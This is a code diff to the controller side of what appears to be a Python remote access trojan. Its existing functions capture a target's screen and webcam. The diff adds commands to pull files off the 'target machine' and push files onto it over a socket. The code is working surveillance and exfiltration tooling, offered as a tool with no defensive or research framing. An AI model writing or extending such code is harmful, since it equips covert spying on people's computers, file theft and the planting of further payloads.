@@ -221,7 +221,7 @@ def screenCapture(conn):
 	output=conn.recv(10240).decode()
 	print(output,end="")
 
-# to capture webcam feed of target
+# to capture webcam feed of target - webcam command
 def webcamCapture(conn):
 	print("capturing..")
 	l=int(conn.recv(20480).decode())
@@ -277,8 +277,64 @@ def screenshot(conn):
 	show_image()
 	os.remove("ss.jpg")
 	output=conn.recv(20480).decode()
+	print(output,end="") 
+
+# to get file from target machine - getfile filepath command
+def getfile(conn,cmd):
+	filepath=cmd.split(" ")[1]
+	l=int(conn.recv(20480).decode())
+	if l==0:
+		print("Error in extracting file...try again")
+		conn.send("Error".encode())
+	else:
+		print("Extracting file")
+		conn.send("start".encode())
+		filename=os.path.basename(filepath)
+		f=open(filename,"wb")
+		curr_len=0
+		while curr_len<l:
+			print(end="\r")
+			data=conn.recv(204800)
+			curr_len+=len(data)
+			f.write(data)
+			print("Progress: {a:.2f} %".format(a=(curr_len/l)*100),end="")
+
+
+		f.close()
+		print("\ndone..")
+		conn.send("done".encode())
+
+	output=conn.recv(20480).decode()
 	print(output,end="")
 
+# to send file to target machine -sendfile filepath command
+def sendfile(conn,cmd):
+	filepath=cmd.split(" ")[1]
+	try:
+		f=open(filepath,"rb")
+		data=f.read()
+		print("Sending File")
+		l=len(data)
+		conn.send(str(l).encode())
+		res=conn.recv(2048)
+		conn.send(data)
+		curr_len=0
+		while curr_len<l:
+			print(end="\r")
+			x=int(conn.recv(20480).decode())
+			curr_len+=x
+			print("Progress: {a:.2f} %".format(a=(curr_len/l)*100),end="")
+
+
+		print("\ndone..")
+		conn.send("done".encode())
+		f.close()
+	except:
+		print("Error sending file...try again")
+		conn.send("0".encode())
+
+	output=conn.recv(20480).decode()
+	print(output,end="")
 
 
 # Function for sending commands to target machine
@@ -313,6 +369,15 @@ def send_target_commands(conn):
 			if client_response == "capturing_webcam" :
 				webcamCapture(conn)
 				continue
+
+			if client_response == "sending_file":
+				getfile(conn,cmd)
+				continue
+
+			if client_response == "recieving_file":
+				sendfile(conn,cmd)
+				continue
+
 
 			print(client_response,end="") #print client response and end="" is used so that next command begins from new line in terminal
 		except Exception as e:
